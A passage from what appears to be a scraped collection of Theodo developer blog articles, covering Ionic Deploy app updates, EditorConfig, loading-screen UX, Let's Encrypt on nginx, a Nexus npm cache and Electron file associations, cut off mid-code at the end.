those.\nWrap up\nIn this article we have paved the way for our very first React, Redux and\nImmutable web app. Our UI is modular, fully tested and ready to be wired up with\nthe actual app logic. How will that work? How can these seemingly dumb\ncomponents, that don\u2019t even know what they are supposed to do, empower us to\nwrite an app that can travel back in time?\nPart two of the tutorial is available here!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tNicolas Goutay\r\n  \t\t\t\r\n  \t\t\t\tWebdeveloper at Theodo. Webdesign & UX enthusiast.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tIn part 1 of this tutorial, we learned how you can get your Ionic app to self-update, to deploy new code whenever needed, instead of having to wait up to two weeks for Apple to review your new versions.\nDeploy channels\nAs with web applications, you may want to first deploy features on a test application (often called staging), to also have a preproduction application, or even to have specific versions to test latest large features (A/B testing for instance).\nIonic Deploy handles this need with channels. You can manage your channels on the Ionic Platform Dashboard\u2018s Deploy section. By defaut, the \u201cProduction\u201d channel is used and a few others were also already created, but you can create a lot more.\nPushing environment specific updates\nTo push only to a certain environment, just add the --deploy flag. For instance, if you a have a staging channel, you can simply use\nionic upload --deploy staging\r\n\nI recommend against using the \u201cProduction\u201d channel as it is the one used by default when uploading a new version without specifying a deploy value.\nFetching environment specific updates\nLet\u2019s say you have an angular constant channelTag being the tag of the channel. Fetching updates only from this specific channel can be done by adding a single line to the code from the first part of the tutorial. Check this out.\n.run(function($ionicPopup, channelTag) {\r\n  var deploy = new Ionic.Deploy();\r\n  deploy.setChannel(channelTag);\r\n  deploy.watch().then(function() {}, function() {}, function(updateAvailable) {\r\n    if (updateAvailable) {\r\n      deploy.download().then(function() {\r\n        deploy.extract().then(function() {\r\n          deploy.unwatch();\r\n          $ionicPopup.show({\r\n            title: 'Update available',\r\n            subTitle: 'An update was just downloaded. Would you like to restart your app to use the latest features?',\r\n            buttons: [\r\n              { text: 'Not now' },\r\n              {\r\n                text: 'Restart',\r\n                onTap: function(e) {\r\n                  deploy.load();\r\n                }\r\n              }\r\n            ],\r\n          });\r\n        });\r\n      });\r\n    }\r\n  });\r\n};\r\n\nOne codebase, several applications\nUsing a single codebase and being able to hold all the versions of your app simultaneously on your phone can be achieved in a few extra steps:\n\nYou need to be able to generate specific cordova config.xml files for the different versions\nYou need to be able to generate a different channelTag constant for each version of your app\n\nLet\u2019s start by building a config.tpl.xml file, which is to be the template of the cordova config file. Place it on the root of your project.\nconfig.tpl.xml\n<widget xmlns=\"http://www.w3.org/ns/widgets\" xmlns:cdv=\"http://cordova.apache.org/ns/1.0\" id=\"<%=appId%>\" version=\"<%=version%>\">\r\n  <name><%=appName%></name>\r\n  <description>Updaty is a great app which self updates</description>\r\n  <author email=\"dev@theodo.fr\" href=\"http://theodo.fr\">Theodo</author>\r\n  <content src=\"index.html\"/>\r\n</widget>\r\n\nA few values are to be injected in the file:\n\nThe app id (which looks like a reverse url such as a java package name and must match your apple developper app id)\nThe application\u2019s version\nThe application\u2019s name (which will appear below your app icon on the phone). I usually use the application\u2019s real name for the production version, and shortened names containing the environment for other versions of the app.\n\nLet\u2019s now create a config.json file (also placed at the root of your project) which will define those values for each environment:\nconfig.json\n{\r\n  \"staging\": {\r\n    \"appId\": \"fr.theodo.updaty-staging\",\r\n    \"appName\": \"Updaty Staging\"\r\n  },\r\n  \"prod\": {\r\n    \"appId\": \"fr.theodo.updaty\",\r\n    \"appName\": \"Updaty\"\r\n  }\r\n}\r\n\nGenerating the environment specific files\nA simple gulpfile is enough to generate all the files you need. Pick up the following libraries to start off:\nnpm install --save-dev gulp-ng-constant gulp-ionic-channels yargs\r\n\ngulpfile.js\nvar gulp = require('gulp');\r\nvar ionicChannels = require('gulp-ionic-channels');\r\nvar ngConstant = require('gulp-ng-constant');\r\n\r\nvar args = require('yargs').default('channelTag', 'staging').argv;\r\n\r\ngulp.task('config', function() {\r\n  gulp.src('./config.json')\r\n  .pipe(ionicChannels({\r\n    channelTag: args.channelTag\r\n  }))\r\n  .pipe(ngConstant())\r\n  .pipe(gulp.dest('./www/js'));\r\n});\r\n\nSimply running gulp config will generate ./config.xml and ./www/js/config.js for the staging channel tag, and gulp config --channelTag prod will do the same for the prod channel tag.\nconfig.xml (output)\n<widget xmlns=\"http://www.w3.org/ns/widgets\" xmlns:cdv=\"http://cordova.apache.org/ns/1.0\" id=\"fr.theodo.updaty-staging\" version=\"0.0.1\">\r\n  <name>Updaty Staging</name>\r\n  <description>Updaty is a great app which self updates</description>\r\n  <author email=\"dev@theodo.fr\" href=\"http://theodo.fr\">Theodo</author>\r\n  <content src=\"index.html\"/>\r\n</widget>\r\n\nwww/js/config.js (output)\nangular.module(\"config\", [])\r\n\r\n.constant(\"appId\", \"fr.theodo.updaty-staging\")\r\n\r\n.constant(\"appName\", \"Updaty Staging\")\r\n\r\n.constant(\"version\", \"0.0.1\")\r\n\r\n.constant(\"channelTag\", \"staging\")\r\n\r\n;\r\n\ngulp-ionic-channels\nI made it all easy for you with this gulp plugin I developed, which takes the config.json file as source, adds to it the version from your package.json file as well as the channelTag passed as an argument, and uses it to:\n\nPass the enriched (and environment filtered) configuration to the next gulp pipe\nGenerate from the template (by default it looks for ./config.tpl.xml) a cordova configuration file (by default ./config.xml).\n\ngulp-ng-constant\nThis useful plugin will generate a javascript file which contains all the angular constants you need from the enriched configuration returned by gulp-ionic-channels, such as the channelTag constant.\nFinal modifications\nYou finally need to edit\n\nyour ./www/index.html file to include the file generated by gulp-ng-constant:\n\n<!-- your app's js -->\r\n<script src=\"js/config.js\"></script>\r\n<script src=\"js/app.js\"></script>\r\n<script src=\"js/controllers.js\"></script>\r\n<script src=\"js/services.js\"></script>\r\n\n\nyour ./www/js/app.js file to include the module generated by gulp-ng-constant:\n\nangular.module('updaty', ['config', 'ionic', 'ionic.service.core', 'updaty.controllers', 'updaty.services'])\r\n\nYou should be good to go!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tWoody Rousseau\r\n  \t\t\t\r\n  \t\t\t\tWoody is a full-stack web developer, who believes in building complex applications, with a focus on speed without compromising code quality. He also loves adding  as many Github badges as possible on his repositories.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWhy use EditorConfig?\nDevelopers do not want to take time to define and maintain consistent coding styles. But what if:\n\nyour team uses different editors and IDEs?\nyour team members are never the same?\nyou are on several projects at the same time?\n\nYes, you can set project settings, and ask your team to do the same. But there is a better way!\n\nIndeed, you can create an .editorconfig file in your project directory with all the coding rules you want to be respected.\nYou won\u2019t be the first to use it, look at all these projects using EditorConfig\u2026\nHow does it work?\nIt\u2019s simple to use and EditorConfig\u00a0gives a really clear example.\nThis file is setting end-of-line and indentation styles for JS and Python.\n\nThere are two useful tips to know:\n\nYou can find the complete list of properties here\nEditorConfig plugins look for a file named .editorconfig\u00a0in the directory of the opened file and in every parents.\n\nThe search will stop if the root filepath is reached or when an option root=true\u00a0is found.\nYou said plugins?\nDepending on the editor you use, you might have to install a plugin.\nA lot of editors are supported, like Atom, Eclipse, Emacs, PhpStorm, SublimeText, Vim or Xcode.\nYou\u2019re using BBEdit, CLion, GitHub, IntelliJIDEA, RubyMine, SourceLair or WebStorm? Good news, you don\u2019t have to do anything.\nSo now, what is your excuse for not using it?\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tVincent Langlet\r\n  \t\t\t\r\n  \t\t\t\tVincent Langlet is an agile web developer at Theodo.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tIf you love hybrid mobile development, it\u2019s probably because you are also really fond of web development.\nOne of the reasons is likely that you\u2019re always certain that users are getting the latest version you deployed.\nHybrid mobile development sure is moving fast, but this was made possible only a few months ago, thanks to\nIonic Deploy, one of the greatest features of Ionic.io. Before, you had to wait up to two weeks for Apple to approve each update. Here\u2019s how you can get those out there with a single command.\nCreating your app\nCreating an Ionic app is dead easy. Start by signing up on Ionic.io and get ready to code.\nI\u2019m calling my app updaty but please do pick your own name.\nnpm install -g cordova ionic\r\nionic start updaty tabs\r\ncd updaty\r\nionic add ionic-platform-web-client\r\nionic io init\r\nionic plugin add ionic-plugin-deploy\r\n\nGuess what? You already have an app using a basic tabs template and it\u2019s already hooked up with Ionic.io services, including Ionic Deploy. You can get some information about your application on the Ionic.io Dashboard where your app should now be listed.\nIonic View\nIonic View allows you to very quickly get testers or clients to use your application. Just run ionic upload and anyone having your credentials or who was invited through the \u201cSettings->Collaborators\u201d section of the dashboard will be able to try out your app using the Ionic View app, available on the App Store and Google Play Store.\nHere\u2019s the catch : only a few cordova plugins will work, and you will not always have the same behavior than your application once it gets in production. I highly recommend it when starting out if you want to quickly show features to your client, but start working on getting a real application provisionned, for instance to follow the rest of the tutorial.\nIonic Deploy\nLet\u2019s get serious. Let\u2019s say you\u2019ve got the actual application on your phone, maybe even in production and let\u2019s also say you really like agile development and you don\u2019t want users to have to download a new version to get all the features you want to put daily in production.\nIonic Deploy gives you quite a few possibilities on how you want to handle the updating of your application, which always requires a restart when over.\nMy recommandation is to always download the latest version on the background, but not to restart the app immediately, so that :\n\nThe user can use your app while the update is being downloaded\nThe user can dismiss the restart if he/she is busy using your app\n\nFetching updates\nHere is how I fetch updates, with the help of $ionicPopup in order to give the possibility of dismissing the restart of the app.\n.run(function($ionicPopup) {\r\n  var deploy = new Ionic.Deploy();\r\n  deploy.watch().then(function() {}, function() {}, function(updateAvailable) {\r\n    if (updateAvailable) {\r\n      deploy.download().then(function() {\r\n        deploy.extract().then(function() {\r\n          deploy.unwatch();\r\n          $ionicPopup.show({\r\n            title: 'Update available',\r\n            subTitle: 'An update was just downloaded. Would you like to restart your app to use the latest features?',\r\n            buttons: [\r\n              { text: 'Not now' },\r\n              {\r\n                text: 'Restart',\r\n                onTap: function(e) {\r\n                  deploy.load();\r\n                }\r\n              }\r\n            ]\r\n          });\r\n        });\r\n      });\r\n    }\r\n  });\r\n};\r\n\n\nwatch takes as a third argument a progress function, which gets called every minute to check for updates. That way, a new update can be fetched even if the user never closes the application. We want to start watching as soon as the app starts, hence putting all of this in a run block. This check is done in the background and asynchronously, which means that there is no impact on the performance of the application.\ndownload downloads the latest update into your device.\nextract extracts it.\nOnce the update is extracted, it is applied to your application the next time it gets restarted;\nunwatch gets called because we want to stop trying to fetch new updates, until the user has chosen to restart the app now or later.\nload restarts the app immediately and gets called only if the user taps on the \u201cRestart\u201d button.\n\nPushing updates\nOnly one command is needed, and you already know it! That\u2019s right, I\u2019m talking about ionic upload!\nOn your (now very familiar) Ionic.io Dashboard, you can get on the \u201cDeploy\u201d section all the updates you deployed, and have the possibility to rollback to an older version if you made a mistake! Oops!\nWhat\u2019s next?\nIn part 2, we see how we can handle multiple environments by having several versions of your app (staging, preprod, prod for instance) with a single codebase, and getting environment specific updates using gulp, a few gulp plugins, and Ionic Deploy.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tWoody Rousseau\r\n  \t\t\t\r\n  \t\t\t\tWoody is a full-stack web developer, who believes in building complex applications, with a focus on speed without compromising code quality. He also loves adding  as many Github badges as possible on his repositories.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tRepetition is critical for learning. This article:\u00a0http://lifeinthefastlane.com/learning-by-spaced-repetition/\u00a0outlines how the ideal repetition period is 1 day, 10 days, 1 month, and 3 months after initially learning something to ensure that you remember it. Therefore, when you have something very important to learn (like this \ud83d\ude09 ) , email it to yourself, and set a Boomerang for 1 day ahead, then when it comes back, set it for 10 days, then 1 month, then 3 months.\u00a0\n\nUsing boomerang is a neat trick for this, but the underlying principle is deeper: just because people have done something once, does not mean that they will remember it.\n\n\nThere are two ways this repetitive learning principle using Boomerang can be used:\n\n\nTo help everyone adopt new standards across Theodo.\u00a0When a new standard is instituted, it is important that everyone uses it. Therefore, when a new standard comes into use, for example: \u201ceveryone must wear a christmas jumper in December\u201d, if an email is sent to people a day after the standard is agreed upon, 10 days after, a month after and 3 months after, and everyone responds with \u201cyes, I am doing this\u201d, \u00a0then it is much, much more likely that people will remember how to do it.\n\n\nTo help new people learn Theodo standards.\u00a0When you have a new coachee, you could make sure they have learned a particular standard by following up with them 1 day, 10 days, 1 month and three months later.\n\n\nI hope you find this to be a useful trick!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tSam Parlett\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t29th October 2015, Amsterdam, Netherlands @Velocity Conf\nAt the last VelocityConf (http://velocityconf.com/devops-web-performance-eu-2015) in Amsterdam, we attended a very interesting talk about waiting phases. \nYou have an app. Everything works, but it\u2019s slow and users are bored and some even leave. You can do a lot of things, but once you have used all your tips and tricks to speed up interface loading, rendering, and keeping it fluent and it\u2019s still not enough, you have to ask yourself : what else can I do? What kind of magic tricks can I, as a developer, device to keep the user busy and make cool animations at the same time?\nIt\u2019s a very challenging mission to keep the user\u2019s attention focused during waiting phases (loading mainly). The technical team has to make the Product Owner aware of the importance of those phases. Another advice will be to work with UX/UI designers to get innovative inputs. These designers have another vision of web interfaces and can help you to find the right animation or sentence that will make your loading phase captivating.\nHere are some frequent solutions that are disappointing in my opinion :\nHave blank blocks or entire blank pages during loading. Instead, display at least your logo to replace blank pages.\n\nDisplay spinners during the whole loading period: users will think it\u2019s slow.\n\u00a0\n\nSo to avoid these old and sticky loaders and to create your first \u201cfun\u201d loading phase, here are some tips:\n\u00a0\nAdding an engaging text can help: to \u201cfind fun\u201d. \n\nCreate animations during page loading. For example, you can use the seagull effect: it\u2019s going somewhere unlike a spinner. It\u2019s a very easy way to transform a boring loader into a funny animation.\n\nUse fake layouts without datas to make transitions more fluent. \n\nUse specific and lite modules: display some news about your application, the company or anything else.\nThese websites are a great source of inspiration: \n\nhttp://designmodo.com/free-preloaders-spinners/\nhttp://codepen.io/collection/HtAne/\n\n\u00a0\nTestimonial from Rapha\u00ebl, an experienced Theodoer who had to face the situation in real life\nWe were building an app for a bank, but it wasn\u2019t responding as fast as expected. Once, the beta testers even told us they thought the app was broken. First, we worked for three\u00a0entire\u00a0days on optimizing the backend, and managed to cut loading times by half. However, it wasn\u2019t satisfactory enough and we had no time left before launch. We decided to include the please-wait.js library in our app : https://pathgather.github.io/please-wait/. It shows a splash page while your application loads. We managed to plug it on the onRouteChange angularJS event, to make the splash screen pop out on each angular route change. This is actually the most efficient optimisation we made. We managed to wipe out the feeling of having a slow application in no more than an hour of coding. Nobody told us it was slow ever since.\n\u00a0\nThe lesson is : keep your user busy instead of just asking him to be patient. He\u2019ll be grateful!\nSources:\nJean-Pierre Vincent, Fake it until you make it: Interface design to the rescue of performance, speak @VelocityConf 2015 in Amsterdam\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tNicolas Boutin\r\n  \t\t\t\r\n  \t\t\t\tNicolas is a former entrepreneur and a web agile developer. After making all the mistakes launching his first startup in SME's digital transformation he joined Theodo to learn how to build web and mobile applications keeping customers satisfied. Symfony + APIPlatform + React is his favorite stack to develop fast and easy to maintain app. He's still eager to start a new venture.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tTo celebrate this, I will guide you through the 6 steps required to get an auto-hosted, HTTPS website. With its own TLD domain. For free. Yeah!\nIt should take a few minutes of your time. We will only be using free services. It will also allow you to try the https://letsencrypt.org initiative on an Nginx server.\nStep 1:\nThere are some services that allow you to register domains for free:\n\nhttp://noip.com\nhttp://dyndns.org\nhttp://registry.cu.cc\n\nUnfortunately, it will not work with these domains. Let\u2019s encrypt is currently limiting the number of certificates issued per top domain (*.noip.me, *.cu.cc\u2026), and you will most likely not be the first one on these domains.\nThe solution I found is to use http://freenom.com which offer free TLDs (.ga, .ml\u2026): it works, but I would only use it for personal use.\nChoose your domain name, and enter your DNS records.\n\n\u00a0\nStep 2:\nI will assume for all the following commands that you are using a Debian based distribution, but you can easily find documentation for your favorite distro.\nBoot up your Raspberry pi or whatever server you will be using to host your website, SSH to it, and install Nginx:\nuser@webserver:~$ sudo apt-get update && sudo apt-get upgrade\r\nuser@webserver:~$ sudo apt-get install nginx\r\nuser@webserver:~$ sudo /etc/init.d/nginx start\r\n\nTest the default, local website: http://my.rpi.local.ip\nIf you do not know Nginx or want to know more, Maxime wrote a nice article about the basics of nginx.\nStep 3 (optional):\nWrite a website. Easiest step ever.\n\nOr you can just use the default website, nobody is judging you\u2026\nStep 4:\nEdit the nginx configuration file for your website.\nuser@webserver:~$ sudo vim /etc/nginx/sites-available/default\r\n\nListen on the server name you registered earlier: server_name myhostname.ga\nSave, restart nginx: sudo /etc/init.d/nginx restart\nStep 5:\nIn your router, add a static route for your server, open ports 80 and 443 and redirect them to your internal ip.\n\nTry the HTTP website on the public domain you registered earlier:\nhttp://myhostname.go. If you get an answer, you are good to go. If not, wait longer for the DNS redirection to propagate.\nStep 6: Let the magic begin!\n\nFirst, install the letsencrypt cli on your webserver.\nuser@webserver:~$ git clone https://github.com/letsencrypt/letsencrypt\r\nuser@webserver:~$ cd letsencrypt\r\n\nEnabling Nginx plugin\nAs Nginx is not yet supported, you have to enable it manually. If you use Apache, this step is not required.\nuser@webserver:~/letsencrypt$ vim bootstrap/venv.sh\r\n\nFind line\n$VENV_BIN/pip install -U -r py26reqs.txt letsencrypt letsencrypt-apache # letsencrypt-nginx\r\n\nand uncomment letsencrypt-nginx. It becomes:\n$VENV_BIN/pip install -U -r py26reqs.txt letsencrypt letsencrypt-apache letsencrpyt-nginx\r\n\nGenerate first certificate!\nYou are now ready to obtain your first Let\u2019s encrypt certificate. We will use the default command, with the debug, verboseand nginx flags enabled:\nuser@webserver:~/letsencrypt$ ./letsencrypt-auto --nginx --debug --verbose\r\n\nAnd just follow the wizard\u2026\n\nResult\nGo visit your website again, only this time, hit the https endpoint.\n\n\n(Very light) Troubleshooting\n\nIf you have an error when signing your certificate request:\nError: urn:acme:error:rateLimited:: There were too many requests of a given type:: Error creating new cert:: Too many certificates already issued for: noip.me/cu.cc/\u2026\r\n\nyou probably missed the line in step 1:\nUnfortunately, it will not work with these domains.\nBuy a domain or find another one!\nConclusion\nLet\u2019s encrypt is in very early development phase for nginx, and not really supported at the moment. The script updates /var/nginx/nginx.conf with the required configuration. Still, you can access the generated keys and certificates:\n\n/etc/letsencrypt/live/<domain name>/privkey.pem\n/etc/letsencrypt/live/<domain name>/fullchain.pem\n\nYou are obviously free to use these certificates any way you want and edit the nginx configuration files. However, these certificates are only valid for 3 months. The main idea behind Let\u2019s encrypt is to automate the generation of certificates.\nThe automation step seems ready for Apache (you add a cronjob calling letsencrypt-auto and that\u2019s it, your certificates get updated), but not quite yet for Nginx. If you want to use the automatic renewal, you probably will have to keep the configuration files untouched.\nHowever, a number of projects are starting to appear. For instance, a Docker Let\u2019s Encrypt companion container for nginx-proxy was shared some days ago by the docker team, or Synology announced they will soon integrate Let\u2019s Encrypt in the DiskStation Manager.\nLinks\n\nhttps://www.theodo.fr/blog/2014/08/learn-the-basics-of-nginx/\nhttps://letsencrypt.org/\nhttps://letsencrypt.readthedocs.org/\nhttps://github.com/letsencrypt/letsencrypt\nhttp://freenom.com\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tKevin Raynel\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tRemember the last time you ran the npm install command, and you had time to grab three coffees, learn Russian and read Dostoievski before you could do anything productive?\nDuring the installation of a node app, the npm install step is doubtless the most time consuming one. Assuming your network is somehow slow it can be endless\u2026 It\u2019s inefficient because this command will download packages that you might have already downloaded tens of times for this app or another.\nThe npm cache already saves approximately 30% of the installation time: when packages are in the npm cache, the initial metadata request sends the cached ETag for the package, and in the vast majority of cases, the registry will return a 304 and the package tarball won\u2019t need to be downloaded again. However, the number of HTTP requests is still the same so there is some time that can still be saved.\nAlthough I do recognize the social gain of taking a coffee break with your teammates, I will tell you how to avoid taking a coffee each time you run npm install thanks to Nexus!\nNexus\nNexus is a a repository manager developed by Sonatype. In other words it can simulate the npm registry on your host. It supports other repositories such as RPM, Maven, Docker Registry\u2026\nInstall Nexus\nThe simplest way to use Nexus is to pull the official Docker image.\n\r\ndocker run -d --name nexus-data sonatype/nexus\r\ndocker run -d -p 8081:8081 --name nexus --volumes-from nexus-data sonatype/nexus\r\n\nIt can take some time (2-3 minutes) for the service to launch in a new container. You can tail the log to determine once Nexus is ready:\n\r\ndocker logs -f nexus\r\n\nOtherwise following the official installation guide would take approximately 30 minutes.\nHere are the main steps for ubuntu 15.10 (easily adaptable for other OS):\n\r\n# install Java 8 JRE\r\nsudo add-apt-repository ppa:webupd8team/java\r\nsudo apt-get update\r\nsudo apt-get install oracle-java8-installer\r\n\r\n# Download Nexus archive\r\nsudo mkdir -p /opt/sonatype\r\nsudo wget http://download.sonatype.com/nexus/oss/nexus-installer-3.0.0-m6-unix-archive.tar.gz /opt/sonatype\r\nsudo tar xvzf nexus-installer-3.0.0-m6-unix-archive.tar.gz --directory /opt/sonatype && rm nexus-installer-3.0.0-m6-unix-archive.tar.gz\r\nsudo ln -s /opt/sonatype/nexus-3.0.0-b2015110601 /opt/sonatype/nexus\r\n\r\n# Launch the Nexus server:\r\n/opt/sonatype/nexus/bin/nexus run\r\n\nThen you can access the web interface here: http://localhost:8081/\nSet up the Nexus server\nThe next steps are based on Nexus guide for npm.\nthis video shows how to do the steps below!\n\nLog in as \u2018admin\u2019 with the default password \u2018admin123\u2019 (you should change it as explained in the post install checklist)\nCreate a npmjs proxy:\n\nCreate a new repository: Parameters > Repositories > Create repository\nSelect \u201cnpm proxy\u201d (the \u201cnpm hosted\u201d allow to store private packages and is not in the scope of this article)\nFill the form (name: \u201cnpm-proxy\u201d, remote storage: \u201chttps://registry.npmjs.org\u201d check \u201cUse the Nexus truststore\u201d, select \u201cdefault\u201d for the blobstore) and click on \u201ccreate repository\u201d\n\n\nCreate a repository group\n\nThen create a new repository \u201cnpm group\u201d\nI named it \u201cnpm\u201d and fill the simple form including the repository you just created\n\n\n\nTell npm to hit the Nexus repository\nIn ~/.npmrc file, replace the line by:\n\r\n# add the URL of the repository\r\nregistry = http://localhost:8081/content/groups/npm/\r\n\nNow try to install a package. Then you\u2019ll find it in the list of components in the nexus npm repository. You can disconnect from the Internet, remove your node modules and re-install. Voil\u00e0!\nUnfortunately the official docker image does not provide the version 3 of Nexus so you cannot browse the npm packages.\nBonus: configure your local repository as a service\nTo avoid starting the nexus server each time you reboot, you can configure nexus as a service that will start during the boot phase.\nIf you\u2019re using a docker image, you\u2019ll just have to use the --restart=always option in your run commands.\nOtherwise, the Nexus guide explain how to do it but it is not simple and the doc is not up to date (this is actually the reason why I started using Docker).\nAlternatives\nThere are alternatives to Nexus to cache npm packages. Here are two interesting ones:\n\nnpm-cache wraps npm and includes cache utilities but it breaks the standard way to install node apps. Who expects to run npm-cache install instead of npm install to install a node app?\nnpm-proxy-cache is a simple node app doing the same job as Nexus but I don\u2019t like the fact it\u2019s not a formal registry (have you used it? Your feedback would be great).\n\nConclusion\nUsing Nexus saves approximately 30% of the installation time of packages already in the npm cache.\nThis is one of the many use cases of Nexus. You can easily set up this tool to store private packages and thus improve your installation process. This tool can be useful for companies with security concerns that do not want to access the Internet during the installation process.\nSo install Nexus but don\u2019t forget to heavily test your app to run npm test and get another excuse to take a coffee break with your teammates!\nYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\n\r\n\t\r\n\t\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t\t\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t\t\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t\t\t\t\r\n\t\t\t\t\t\t\t\t\t\r\n\t\t\t\t\r\n\t\t\t\t\r\n\r\n\t\t\t\t\r\n\t\t\t\t\r\n\r\n\t\t\t\t\r\n\t\t\t\t\r\n\r\n\t\t\t\t\r\n\t\t\t\t\u00a0Submit\t\t\t\t\r\n\t\t\t\t\r\n\t\t\t\r\n\t\t\t\r\n\r\n\t\t\t\r\n\t\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tNicolas Girault\r\n  \t\t\t\r\n  \t\t\t\tNicolas is a web developer eager to create value for trustworthy businesses.\r\nSurrounded by agile gurus at Theodo, he builds simple solutions along with tech-passionates.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nFollowing our introduction to the Electron framework\u00a0and our demo using Angular with Electron, the Electron experience continues!\nIn this article dedicated to the Windows platform, we will expand on how to associate a file extension\u00a0to your Electron application and how to import a data store from a file after double-clicking on it.\nHow to set file associations to your Electron app on Windows\nPreviously, we have explained how to build an app for a Windows platform with electron-builder.\nTo define your own file association using the same builder tool, you must create a custom NSIS installation script following the steps below.\nReminder: Nullsoft Scriptable Install System (NSIS) is a script-driven Installer authoring tool for Microsoft Windows.\nFirst, copy the Electron builder\u2019s one installer.nsi.tpl and include the file association script - FileAssociation.nsh\u00a0from http://nsis.sourceforge.net\nHere is our folder tree:\nmyapp\r\n\u2514\u2500\u2500 nsi-template\r\n    \u251c\u2500\u2500 include\r\n    \u2502\u00a0\u00a0 \u2514\u2500\u2500 FileAssociation.nsh\r\n    \u2514\u2500\u2500 installer.nsi.tpl\r\n\nThen, copy the default Electron Builder\u2019s installer.nsi.tpl in your template and add the lines below:\n# modification: add file association script\r\n# projectNsiTemplateDir is replaced by a gulp task: nsi-template\r\n########\r\n!addincludedir \"@projectNsiTemplateDir\"\r\n!include \"FileAssociation.nsh\"\r\n########\r\n\r\n...\r\n# default section start\r\nSection\r\n ...\r\n  # modification: define file association\r\n  ########\r\n  ${registerExtension} \"$INSTDIR\\${APP_NAME}.exe\" \"@projectExtension\" \"@projectFileType\"\r\n  ########\r\n...\r\n\nYou can directly replace @projectNsiTemplateDir (absolute path), @projectExtension and @projectFileType by your own params\u00a0or use the gulp task below:\nvar constant = {\r\n    cwd: process.env.INIT_CWD || '',\r\n    nsiTemplate: './nsi-template/include/',\r\n    fileAssociation: {\r\n        extension: '.myapp',\r\n        fileType: 'My Awesome App File'\r\n    }\r\n};\r\n\r\n// task to generate nsi-template for windows\r\ngulp.task('nsi-template', function () {\r\n    var projectIncludeDir = 